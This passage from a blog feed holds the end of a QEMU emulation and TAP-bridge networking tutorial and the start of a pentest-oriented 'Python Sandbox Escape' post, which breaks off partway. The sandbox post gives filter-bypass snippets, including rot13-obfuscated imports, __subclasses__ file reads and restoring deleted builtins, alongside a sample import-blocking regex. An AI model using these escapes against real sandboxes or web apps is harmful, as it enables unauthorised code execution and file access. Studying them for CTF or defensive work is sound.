<h3 id="Create-Virtual-Disk"><a href="#Create-Virtual-Disk" class="headerlink" title="Create Virtual Disk"></a>Create Virtual Disk</h3><p>It prepares for installation of virtual machine.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ qemu-img create -f qcow2 OS.img 20G</span><br><span class="line"><span class="comment"># &#x27;create&#x27; means to create vm disk</span></span><br><span class="line"><span class="comment"># &#x27;-f qcow2&#x27; assigns its format. vmdk and qcow are ok.</span></span><br><span class="line"><span class="comment"># &#x27;OS.img&#x27; names the vm disk</span></span><br><span class="line"><span class="comment"># &#x27;20G&#x27; means the size</span></span><br></pre></td></tr></table></figure>
<h3 id="Install-x2F-Run-Virtual-Machine"><a href="#Install-x2F-Run-Virtual-Machine" class="headerlink" title="Install&#x2F;Run Virtual Machine"></a>Install&#x2F;Run Virtual Machine</h3><p>To install virtual machine</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ qemu-system-x86_64 -boot d -cdrom ubuntu-16.04-desktop-amd64.iso -hda OS.img -m 2048 -bios OVMF.fd</span><br><span class="line"><span class="comment"># &#x27;qemu-system-xxx&#x27; depends on what platform you want to use</span></span><br><span class="line"><span class="comment"># &#x27;-boot d&#x27; means boot from cdrom</span></span><br><span class="line"><span class="comment"># &#x27;-cdrom ubuntu-xxx&#x27; assigns the image to install</span></span><br><span class="line"><span class="comment"># &#x27;-hda OS.img&#x27; assigns the vm disk to use</span></span><br><span class="line"><span class="comment"># &#x27;-m 2048&#x27; means using 2048MB memory</span></span><br><span class="line"><span class="comment"># &#x27;-bios OVMF.fd&#x27; assigns bios (default bios is seabios)</span></span><br></pre></td></tr></table></figure>
<p>To accelerate (use kvm)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install qemu-kvm </span><br><span class="line"></span><br><span class="line">$ kvm -boot d -cdrom ubuntu-16.04-desktop-amd64.iso -hda OS.img -m 2048 -bios OVMF.fd</span><br></pre></td></tr></table></figure>
<p>To run virtual machine</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ qemu-system-mips -M malta -nographic -no-reboot -kernel <span class="string">&quot;zImage-mips&quot;</span> -hda <span class="string">&quot;image-mips.ext2&quot;</span> -append <span class="string">&quot;root=/dev/hda rw init=/usr/sbin/init.sh panic=1 PATH=/usr/bin console=ttyS0&quot;</span> -net nic -net tap -drive file=/tmp/share.img</span><br><span class="line"><span class="comment"># &#x27;-M malta&#x27; assigns developing board/platform</span></span><br><span class="line"><span class="comment"># &#x27;-kernel &quot;zImage-mips&quot;&#x27; assigns kernel</span></span><br><span class="line"><span class="comment"># &#x27;-append &quot;xxx&quot;&#x27; gives boot arguments of kernel</span></span><br><span class="line"><span class="comment"># &#x27;-net nic -net tap&#x27; gives network configuration</span></span><br><span class="line"><span class="comment"># &#x27;-drive file=/tmp/share.img&#x27; defines a new drive. </span></span><br><span class="line"><span class="comment"># &#x27;-L&#x27; assigns dynamic lib location</span></span><br></pre></td></tr></table></figure>
<p>Other examples:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ qemu-system-mipsel -kernel openwrt-malta-le-vmlinux-initramfs.elf -M malta  -drive file=/tmp/share.img -net nic -net tap -nographic</span><br><span class="line"> </span><br><span class="line">$ qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -net nic -net tap -nographic</span><br><span class="line"></span><br><span class="line"><span class="comment"># run dynamic linked program, not whole system</span></span><br><span class="line">$ qemu-mipsel -L Path/to/dynamic/linked/libs hello</span><br></pre></td></tr></table></figure>

<p>Note: images and kernel modules can be found <a class="link"   href="https://people.debian.org/~aurel32/qemu/" >Here<i class="fas fa-external-link-alt"></i></a>, in which the <code>README.txt</code> provides QEMU using scripts.</p>
<h3 id="Debug-Programs"><a href="#Debug-Programs" class="headerlink" title="Debug Programs"></a>Debug Programs</h3><p>Since <code>QEMU</code> implements <code>gdbserver</code>, dynamic analysis can be performed by adding <code>-g</code> and <code>gdb</code> attach to it. </p>
<p>First install necessary libs. Take <code>ARM</code> as example.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install -y gcc-arm-linux-gnueabi        <span class="comment">#32-bit</span></span><br><span class="line">$ apt install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu      <span class="comment">#64-bit</span></span><br></pre></td></tr></table></figure>

<p>Here we have:<br>64-bit:<br><code>gcc-aarch64-linux-gnu</code>    <code>g++-aarch64-linux-gnu</code><br>32-bit:<br><code>gcc-arm-linux-gnueabi</code>    <code>gcc-arm-linux-gnueabihf </code><br><code>g++-arm-linux-gnueabi</code>    <code>g++-arm-linux-gnueabihf </code> </p>
<ul>
<li><p>Let’s distinguish the two:<br><code>gcc-arm-linux-gnueabi</code> – The GNU C compiler for <code>armel</code> architecture<br><code>gcc-arm-linux-gnueabihf</code> – The GNU C compiler for <code>armhf</code> architecture<br>The only difference is, they means differnet value of ‘-mfloat-abi’ option of gcc</p>
<p>  There are 3 values to choose for ‘-mfloat-abi’:</p>
<ol>
<li>soft: do float caculation without <code>fpu</code>(floating-point unit), but using software method.</li>
<li>softfp: default method that <code>armel</code> arch uses (default value <code>gcc-arm-linux-gnueabi</code> uses), which means using <code>fpu</code> to calculate, but save arguments in general registors.</li>
<li>hard: default method that <code>armhf</code> arch uses (default value <code>gcc-arm-linux-gnueabihf</code> uses), which means using <code>fpu</code> to calculate, and save arguments in <code>fpu</code> registors.</li>
</ol>
</li>
<li><p>Let’s distinguish <code>gcc</code> and <code>g++</code><br>GCC: GNU Compiler Collection, Referrers to all the different languages that are supported by the GNU compiler.<br><code>gcc</code>: GNU C Compiler<br><code>g++</code>: GNU C++ Compiler</p>
<p>  The main differences:</p>
<ol>
<li><code>gcc</code> will compile: .c&#x2F;.cpp files as C and C++ respectively.</li>
<li><code>g++</code> will compile: .c&#x2F;.cpp files but they will all be treated as C++ files.<br>  Also if you use <code>g++</code> to link the object files it automatically links in the std C++ libraries (<code>gcc</code> does not do this).</li>
<li><code>gcc</code> compiling C files has less predefined macros.</li>
<li><code>gcc</code> compiling .cpp and g++ compiling *.c&#x2F;.cpp files has a few extra macros.</li>
</ol>
</li>
</ul>
<p>Run apps with dynamic libs</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ qemu-arm -L /usr/arm-linux-gnueabi ./filename       <span class="comment">#32-bit</span></span><br><span class="line">$ qemu-aarch64 -L /usr/aarch64-linux-gnu ./filename   <span class="comment">#64-bit</span></span><br></pre></td></tr></table></figure>
<p>Install gdb</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install git gdb gdb-multiarch</span><br></pre></td></tr></table></figure>
<p>Debug 32-bit apps</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># term window 1</span></span><br><span class="line">$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./file</span><br><span class="line"><span class="comment"># term window 2</span></span><br><span class="line">$ gdb-multiarch ./file</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">pwndbg&gt; b *0x8bb0</span><br></pre></td></tr></table></figure>
<p>Debug 64-bit apps</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># term window 1</span></span><br><span class="line">$ qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./file</span><br><span class="line"><span class="comment"># term window 2</span></span><br><span class="line">$ gdb-multiarch ./file</span><br><span class="line">pwndbg&gt; target remote :1234</span><br><span class="line">pwndbg&gt; b *0x8bb0</span><br></pre></td></tr></table></figure>


<h2 id="Network-Configuration"><a href="#Network-Configuration" class="headerlink" title="Network Configuration"></a>Network Configuration</h2><p>QEMU provides 4 network communication methods, which are:</p>
<ol>
<li>User mode stack: to implement a protocol stack in the QEMU process. Work like NAT server.</li>
<li>Socket: Create a socket for a VLAN and connect multiple VLANs together.</li>
<li>TAP &#x2F; bridge: The most important communication method, we need to use this method if we want to apply QEMU virtual machine’s external communication.</li>
<li>VDE: also used for connecting VLAN</li>
</ol>
<p>TAP mode works like VMWare’s network bridge.<br>Essentially implements network card virtually (not physically)</p>
<h3 id="Software-Preparations"><a href="#Software-Preparations" class="headerlink" title="Software Preparations"></a>Software Preparations</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt-get install bridge-utils        <span class="comment"># virtual bridge utils</span></span><br><span class="line">$ apt-get install uml-utilities       <span class="comment"># UML（User-mode linux） utils</span></span><br></pre></td></tr></table></figure>
<h3 id="Build-a-network-bridge"><a href="#Build-a-network-bridge" class="headerlink" title="Build a network bridge"></a>Build a network bridge</h3><p>At first your network is:<br><img src="/imghost/rpp/1.png" alt="original ifconfig result"><br>Build the bridge</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ifconfig your-net-int down           <span class="comment"># stop network interface</span></span><br><span class="line">$ brctl addbr br0                     <span class="comment"># add a bridge br0</span></span><br><span class="line">$ brctl addif br0 your-net-int         <span class="comment"># add an interface in br0</span></span><br><span class="line">$ brctl stp br0 off                   <span class="comment"># spanning-tree-protocol can be closed</span></span><br><span class="line">$ brctl setfd br0 1                   <span class="comment"># set br0 forwarding delay</span></span><br><span class="line">$ brctl sethello br0 1                <span class="comment"># set br0 hello time</span></span><br><span class="line">$ ifconfig br0 0.0.0.0 promisc up     <span class="comment"># start br0 interface</span></span><br><span class="line">$ ifconfig your-net-int 0.0.0.0 promisc up    <span class="comment"># start network interface</span></span><br><span class="line">$ dhclient br0                        <span class="comment"># get br0 ip from dhcp server</span></span><br><span class="line">$ brctl show br0                      <span class="comment"># see br0 list</span></span><br><span class="line">$ brctl showstp br0                   <span class="comment"># see br0 interfaces</span></span><br></pre></td></tr></table></figure>
<p>Type <code>ifconfig</code> to see result:<br><img src="/imghost/rpp/2.jpg" alt="ifconfig result 1"></p>
<p>The brief picture of network (bridge and internet):<br><img src="/imghost/rpp/3.jpg" alt="bridge 1"></p>
<h3 id="Create-a-TAP-device"><a href="#Create-a-TAP-device" class="headerlink" title="Create a TAP device"></a>Create a TAP device</h3><p>Create a TAP device to be an interface on the bridge, which QEMU can use</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ tunctl -t tap0 -u root              <span class="comment"># create a tap0 interface, only accessed by root</span></span><br><span class="line">$ brctl addif br0 tap0                <span class="comment"># add tap0 to br0</span></span><br><span class="line">$ ifconfig tap0 0.0.0.0 promisc up    <span class="comment"># start tap0 interface</span></span><br><span class="line">$ brctl showstp br0                   <span class="comment"># show br0 interfaces</span></span><br></pre></td></tr></table></figure>

<p>Type <code>ifconfig</code> to see result:<br><img src="/imghost/rpp/4.jpg" alt="ifconfig result 2"></p>
<p>Now the picture of network (bridge and internet)<br><img src="/imghost/rpp/5.jpg" alt="bridge 2"></p>
<p>Well, if other device or interface is needed…<br>Existence of more than 2 interfaces is permitted in the bridge:<br><img src="/imghost/rpp/6.jpg" alt="ifconfig result 3"></p>
<h3 id="Connect-QEMU-to-tap0"><a href="#Connect-QEMU-to-tap0" class="headerlink" title="Connect QEMU to tap0"></a>Connect QEMU to tap0</h3><p>Now we just need to connect QEMU vm to tap0</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>
<p>Finally we get vm connected to internet</p>
<p>But the problems are:</p>
<ol>
<li>sometimes, under special circumstances, QEMU cannot connect to internet. type <code>ifconfig</code> to check network configuration, and use <code>dhclient br0</code> to get dhcp ip again.</li>
<li>All commands above used by <code>root</code>, so remember to add <code>sudo</code>.</li>
<li>Once you reboot, all configs disappear. Write a script please.</li>
</ol>
<h3 id="Another-Method"><a href="#Another-Method" class="headerlink" title="Another Method"></a>Another Method</h3><p>Edit &#x2F;etc&#x2F;network&#x2F;interfaces</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto lo </span><br><span class="line">iface lo inet loopback </span><br><span class="line"></span><br><span class="line">auto eth0 </span><br><span class="line">iface eth0  inet manual </span><br><span class="line">up ifconfig eth0  0.0.0.0 up </span><br><span class="line"></span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp </span><br><span class="line">bridge_ports eth0 </span><br><span class="line">bridge_stp off </span><br><span class="line">bridge_maxwait 1</span><br></pre></td></tr></table></figure>
<p>Edit &#x2F;etc&#x2F;qemu-ifup</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh </span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot; </span><br><span class="line">echo &quot;Bringing $1 for bridged mode...&quot; </span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up </span><br><span class="line">echo &quot;Adding $1 to br0...&quot; </span><br><span class="line">sudo /sbin/brctl addif br0 $1 </span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure>
<p>Then</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ chmod a+x /etc/qemu-ifup</span><br></pre></td></tr></table></figure>
<p>Restart network</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ /etc/init.d/networking restart</span><br></pre></td></tr></table></figure>
<p>In this way, there is no need to configure  next time you boot up.</p>
<h3 id="Method-for-WSL-users"><a href="#Method-for-WSL-users" class="headerlink" title="Method for WSL users"></a>Method for WSL users</h3><p>If you use WSL(Windows Subsystem for Linux), the above network modifying is not recommended, because </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># on WSL 1 Ubuntu we failed to add devices</span></span><br><span class="line">$ tunctl</span><br><span class="line">Failed to open <span class="string">&#x27;/dev/net/tun&#x27;</span> : No such file or directory</span><br><span class="line">$ brctl addbr br0</span><br><span class="line">add bridge failed: Invalid argument</span><br><span class="line">$ ifconfig  -a  <span class="comment"># no new devices</span></span><br><span class="line">eth1: ...</span><br><span class="line">eth2: ...</span><br><span class="line">...</span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 1500</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0xfe&lt;compat,link,site,host&gt;</span><br><span class="line">        loop  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># but normally we get (like on WSL 2 Ubuntu):</span></span><br><span class="line">$ tunctl</span><br><span class="line">Set <span class="string">&#x27;tap0&#x27;</span> persistent and owned by uid 0</span><br><span class="line">$ brctl addbr br0</span><br><span class="line">$ ifconfig  -a  <span class="comment"># added br0 and tap0</span></span><br><span class="line">...</span><br><span class="line">br0: flags=4098&lt;BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        ether 12:93:04:50:e6:db  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line">...</span><br><span class="line">tap0: flags=4098&lt;BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        ether 2a:a7:6d:67:b2:00  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
<p>Well, it doesn’t mean this method works on WSL 2. If continue, we have to disable <code>ethx</code> and enable <code>br0</code> to get <code>ip</code> by<code>DHCP</code>. </p>
<p>This step is dangerous since <code>br0</code> cannot receive a valid <code>ip</code> via <code>DHCP</code> and your <code>ethx</code> may not be fine as well.</p>
<p>But We can use available bridge device that <code>docker</code> provides us with – <code>docker0</code>.</p>
<p>On WSL 2 we can use <code>docker</code> (WSL 1 not supporting), though <code>systemctl</code> not </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ apt install docker.io</span><br><span class="line">$ systemctl start docker    <span class="comment"># systemctl still invalid</span></span><br><span class="line">System has not been booted with systemd as init system (PID 1). Cant operate.</span><br><span class="line">Failed to connect to bus: Host is down</span><br><span class="line">$ service docker start</span><br><span class="line">Starting Docker: docker.</span><br></pre></td></tr></table></figure>
<p>And the bridge <code>docker0</code> is assigned a <code>ip</code>: <code>172.17.10.1</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ifconfig  -a</span><br><span class="line">...</span><br><span class="line">docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.10.1  netmask 255.255.255.0  broadcast 172.17.10.255</span><br><span class="line">        ether 02:42:69:86:df:1f  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Then we add a TAP device <code>tap0</code> and connect it with <code>docker0</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ tunctl -t tap0</span><br><span class="line">Set <span class="string">&#x27;tap0&#x27;</span> persistent and owned by uid 0</span><br><span class="line">$ ifconfig tap0 up</span><br><span class="line">$ brctl addif docker0 tap0</span><br><span class="line">$ brctl show</span><br><span class="line">bridge name     bridge id               STP enabled     interfaces</span><br><span class="line">br0             8000.000000000000       no</span><br><span class="line">docker0         8000.02426986df1f       no              tap0</span><br></pre></td></tr></table></figure>
<p>When starting QEMU we add <code>-net nic -net tap,ifname=tap0,script=no,downscript=no</code> at the tail.</p>
<p>On QEMU guest we configure <code>ip</code> and <code>gateway</code> and <code>dns</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ifconfig eth0 172.17.10.xxx/24</span><br><span class="line">$ route add default gw 172.17.10.1</span><br><span class="line">$ echo &quot;nameserver 8.8.8.8&quot; &gt; /etc/resolv.conf</span><br></pre></td></tr></table></figure>
<p>Then the network configuration is finished.</p>
<p>But when using docker virtual machines, conflicts may occur, so you can add <code>&quot;bip&quot;: &quot;x.x.x.x/24&quot;</code> to <code>/etc/docker/daemon.json</code> to assign new <code>ip</code> for <code>docker0</code>.</p>
]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>qemu</tag>
        <tag>arm</tag>
        <tag>mips</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Sandbox Escape</title>
    <url>/2019/10/07/2019-10-07-Python-Sandbox-Escape/</url>
    <content><![CDATA[<p>In some OJ providing python sandbox, or web site written in python and using template rendering (<code>ssti</code> appears), your pentest must have something to do with python sandbox escape. </p>
<h2 id="Python2-Sandbox-Escape"><a href="#Python2-Sandbox-Escape" class="headerlink" title="Python2 Sandbox Escape"></a>Python2 Sandbox Escape</h2><p>When you are in a restricted python environment, to get rid of every limits and spawn a shell is the main target, but kind of tricky.<br>Our final aim is to get shell with the help of <code>os</code>,  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">os.popen(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>eval</code>&#x2F;<code>exec</code>, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>pty</code>, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>subprocess</code>, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.call([<span class="string">&#x27;ifconfig&#x27;</span>],shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>commands</code>, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line">commands.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>timeit</code>, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>and <code>platform</code>, </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="built_in">print</span> platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p>and other modules.</p>
<h3 id="import-Techniques"><a href="#import-Techniques" class="headerlink" title="import Techniques"></a><code>import</code> Techniques</h3><p>You may easily notice that most methods needs <code>import</code>, therefore importing libs is a good choice.</p>
<h4 id="Ways-to-Import"><a href="#Ways-to-Import" class="headerlink" title="Ways to Import"></a>Ways to Import</h4><p>As defenders will not make it easy, there should be filters and checks to prevent possible attacks.<br>The basic idea is to check code content, like</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = <span class="built_in">open</span>(<span class="string">&#x27;code.py&#x27;</span>).read()</span><br><span class="line">pattern  = re.<span class="built_in">compile</span>(<span class="string">&#x27;import\s+(os|commands|subprocess|sys)&#x27;</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;forbidden module import detected&quot;</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure>
<p>But we have other ways to <code>import</code></p>
<ul>
<li><code>import</code>   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx`</span><br><span class="line"><span class="keyword">from</span> x <span class="keyword">import</span> xxx</span><br></pre></td></tr></table></figure></li>
<li><code>__import__</code>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;xxx&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li><code>importlib</code>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib`</span><br><span class="line">f3ck = importlib.import_module(<span class="string">&quot;pbzznaqf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>)</span><br><span class="line"><span class="comment"># bypass filters, decoded as &#x27;commands&#x27; </span></span><br><span class="line"><span class="built_in">print</span> f3ck.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="Ways-to-Reload"><a href="#Ways-to-Reload" class="headerlink" title="Ways to Reload"></a>Ways to Reload</h4>Builtin functions work with no need of <code>import</code>, because they are imported automatically along with <code>__builtin__</code> module being loaded.</li>
</ul>
<p>Then functions like <code>open()</code>, <code>int()</code> and <code>chr()</code> are equivalent to </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtin__.<span class="built_in">open</span>()</span><br><span class="line">__builtin__.<span class="built_in">int</span>()</span><br><span class="line">__builtin__.<span class="built_in">chr</span>()</span><br></pre></td></tr></table></figure>
<p>Therefore <code>eval()</code>, <code>exec()</code>, <code>execfile()</code> and  <code>__import__</code> can be executed in this way.<br>Other ways to operate</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> [entity <span class="keyword">for</span> entity <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__() <span class="keyword">if</span> entity.__name__ == <span class="string">&quot;file&quot;</span>][<span class="number">0</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;open&quot;</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;file&quot;</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;file&quot;</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dir</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;file&quot;</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">dir</span>()[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;open&quot;</span>](<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">__import__</span>(<span class="string">&#x27;__builtin__&#x27;</span>).<span class="built_in">open</span>(<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">__import__</span>(<span class="string">&#x27;__builtin__&#x27;</span>).file(<span class="string">&quot;index.wsgi&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<p>So if we try to defend, delete them by using </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>] <span class="comment"># __import__ is the function called by the import statement</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>] <span class="comment"># evaluating code could be dangerous</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;execfile&#x27;</span>] <span class="comment"># likewise for executing the contents of a file</span></span><br><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;input&#x27;</span>] <span class="comment"># Getting user input and evaluating it might be dangerous</span></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="keyword">del</span> __builtin__.<span class="built_in">chr</span></span><br></pre></td></tr></table></figure>

<p>It’s ok because we can recovery the complete module by </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">reload(__builtin__)</span><br></pre></td></tr></table></figure>
<p>While the truth is, <code>reload</code> is a method under <code>__builtin__</code>, so what if it is deleted already?</p>
<p>We have a module called <code>imp</code> to deal this</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure>
<p>Notice that a module can be reloaded only after it is imported.</p>
<h4 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h4><p>We import libs&#x2F;modules which are already in local file system, so why dont we remove them from disk firstly?<br>Question is where exactly are they?</p>
<p>Use <code>sys</code> to show <code>path</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.path</span><br><span class="line"> </span><br><span class="line">[<span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/plat-x86_64-linux-gnu&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-tk&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-old&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/lib-dynload&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/local/lib/python2.7/dist-packages&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/dist-packages&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;/usr/lib/python2.7/dist-packages/gtk-2.0&#x27;</span>,</span><br><span class="line"> ...]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>It surely contains package directory of <code>pip</code> and <code>conda</code> and other related folders.</p>
<p>Show where a module is</p>
